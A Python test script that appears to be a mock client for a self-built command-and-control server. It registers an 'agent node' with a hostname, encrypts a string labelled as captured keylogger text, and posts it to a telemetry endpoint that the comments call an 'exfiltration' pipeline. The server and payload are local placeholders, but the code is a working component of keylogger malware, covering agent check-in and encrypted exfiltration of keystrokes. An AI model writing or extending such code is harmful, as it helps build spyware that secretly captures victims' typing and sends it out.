import asyncio
from datetime import UTC, datetime
import httpx
from crypto_vault import CryptoVault
from pydantic import Field
from pydantic_settings import BaseSettings, SettingsConfigDict

# Configuration Setup
SERVER_URL = "http://127.0.0.1:8000"
CLIENT_ID = "gabriel"
HOSTNAME = "foedora-workstation-pc"


class Settings(BaseSettings):
    # Field(default=...) tells Pyright it is safe to initialize without arguments
    colossus_shared_key: str = Field(default="placeholder_key_if_env_is_missing")

    model_config = SettingsConfigDict(env_file=".env", extra="ignore")


settings = Settings()
vault = CryptoVault(settings.colossus_shared_key)


async def test_pipeline():
    async with httpx.AsyncClient(base_url=SERVER_URL) as client:
        print("[MOCK CLIENT] initializing connection with C2 server...")

        # Phase !: Register the agent node
        reg_payload = {"client_id": CLIENT_ID, "hostname": HOSTNAME}
        try:
            reg_res = await client.post("/api/v1/agent/register", json=reg_payload)
            print(
                f"[SERVER REGISTRATION RESPONSE] Status: {reg_res.status_code} | Body: {reg_res.json()}"
            )
        except httpx.ConnectError:
            print(
                "[ERROR] Could not connect to FastAPI server. Make sure your server is running on port 8000!"
            )

        # Phase 2: Encrypt and send a mock keylogger string
        raw_captured_text = (
            "testing the secure exfiltration telemetry pipeline! [ENTER]"
        )
        print(f"\n[PLAIN TEXT CONTENT] '{raw_captured_text}'")

        # Encrypt the string
        encrypted_string = vault.encrypt_string(raw_captured_text)
        print(f"[ENCRYPTED CIPHERTEXT] '{encrypted_string[:30]}...'")

        # Package the telemetry payload
        telemetry_payload = {
            "client_id": CLIENT_ID,
            "timestamp": datetime.now(UTC).isoformat(),
            "encrypted_data": encrypted_string,
        }

        # Dispatch down the network pipe
        tel_res = await client.post("/api/v1/agent/telemetry", json=telemetry_payload)
        print(
            f"[SERVER TELEMETRY RESPONSE] Status: {tel_res.status_code} | Body: {tel_res.json()}"
        )


if __name__ == "__main__":
    asyncio.run(test_pipeline())
